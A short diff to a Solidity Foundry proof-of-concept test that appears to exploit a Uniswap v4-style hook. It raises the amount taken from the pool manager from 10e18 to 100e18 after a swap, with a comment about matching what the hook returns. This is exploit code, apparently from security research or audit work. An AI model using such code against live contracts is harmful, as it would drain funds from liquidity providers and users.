@@ -47,7 +47,9 @@ contract POC is Test {
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            manager.take(c0, address(this), 10e18);
+            // FIX: hook returns 100e18, not 10e18 - take 100e18 FIRST
+            manager.take(c0, address(this), 100e18);
+            // then clear the swap leftovers
             if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle();}
             if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle();}
             if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
